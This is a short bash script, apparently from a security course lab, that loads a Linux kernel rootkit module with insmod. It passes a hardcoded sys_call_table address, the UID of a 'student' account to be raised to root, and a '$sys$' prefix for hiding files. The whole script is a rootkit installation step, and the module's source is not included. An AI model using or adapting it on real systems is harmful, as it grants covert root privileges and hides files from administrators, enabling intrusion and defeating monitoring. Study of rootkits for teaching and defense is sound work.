#!/bin/bash

#sys_call_table symbol's address from the /boot/System.map
TABLE_ADDR=ffffffff81801320

#Insert the rootkit module with the sys_call_table, ID to be elevated to root, and the prefix to hide
insmod rootkit.ko table_addr=0x$TABLE_ADDR root_uid="$(id student -u)" magic_prefix='$sys$'

